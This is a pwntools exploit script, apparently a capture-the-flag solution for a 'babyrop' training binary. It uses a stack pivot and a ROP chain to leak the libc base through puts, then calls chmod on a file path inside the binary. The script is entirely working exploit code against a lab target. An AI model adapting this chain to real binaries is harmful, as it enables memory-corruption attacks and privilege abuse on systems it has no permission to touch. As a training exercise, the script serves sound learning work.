from pwn import *

p = process('/challenge/babyrop_level9.0')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(p,'''break *0x401c74''')

gadget1 = 0x401d93      # pop rdi ; ret
gadget2 = 0x401d91      # pop rsi ; pop r15 ; ret
gadget3 = 0x4014b4      # pop rsp ; pop r13 ; pop rbp ; ret
bss = 0x4140e0
puts_plt = 0x401120
read_got = 0x404040
challenge = 0x401a93
string = 0x4027bf
ret = 0x40101a

payload = p64(gadget3)+p64(bss)+p64(gadget1)+p64(read_got)+p64(puts_plt)
payload += p64(ret)*3+p64(challenge)
p.send(payload)
p.recvuntil('Leaving!\n')
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-libc.sym['read']
print(hex(libc.address))

payload = p64(gadget1)+p64(string)+p64(gadget2)+b'a'*72+p64(7)*2
payload += p64(libc.sym['chmod'])
p.send(payload)
p.interactive()
